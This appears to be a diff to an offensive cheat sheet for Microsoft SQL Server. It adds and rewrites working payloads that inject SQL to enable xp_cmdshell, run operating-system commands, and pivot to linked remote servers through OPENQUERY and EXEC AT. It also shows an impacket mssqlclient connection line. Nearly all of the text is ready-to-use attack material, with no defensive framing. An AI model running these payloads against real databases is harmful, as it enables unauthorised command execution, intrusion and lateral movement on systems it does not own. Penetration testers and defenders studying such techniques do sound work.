@@ -12,5 +12,8 @@ test';EXEC master..xp_cmdshell 'ping <ip>'; --
 # Connect to a SQL Server using impacket-mssqlclient and execute commands
 python3 mssqlclient.py <domain>/<username>:<password>@<db-host> -windows-auth -encrypt
 
+# Enable xp_cmdshell on remote server using OPENQUERSY and run a command
+EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT <remote-server>; EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT <remote-server>; SELECT * FROM OPENQUERY("<remote-server>", 'select @@servername; exec xp_cmdshell ''<command>''');
+
 # Enable xp_cmdshell and run a command using sqlcmd
-sqlcmd -E -Q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '<command>';"
+sqlcmd -E -Q "test'; EXEC master..sp_configure 'SHOW advanced options', 1; RECONFIGURE WITH OVERRIDE;  EXEC master..sp_configure 'xp_cmdshell', 1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options', 0; RECONFIGURE WITH OVERRIDE; EXEC master..xp_cmdshell '<command>'; --"
